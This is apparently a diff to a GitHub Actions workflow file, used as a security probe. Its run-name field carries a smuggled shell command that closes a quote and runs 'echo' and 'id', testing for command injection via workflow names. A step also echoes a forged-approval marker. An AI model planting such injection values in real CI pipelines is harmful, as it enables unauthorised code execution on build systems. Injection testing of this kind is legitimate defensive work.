@@ -1,5 +1,5 @@
 name: ApprovalComment
-run-name: 'probe2"; echo WFR_NAME_INJECTION_EXECUTED; id; #'
+run-name: 'probe3"; echo WFR_NAME_INJECTION_EXECUTED; id; #'
 on:
   pull_request:
 permissions: {}
@@ -7,4 +7,4 @@ jobs:
   pass:
     runs-on: ubuntu-latest
     steps:
-      - run: echo attacker-forged-approval-succeeded
+      - run: echo attacker-forged-approval-succeeded-v2
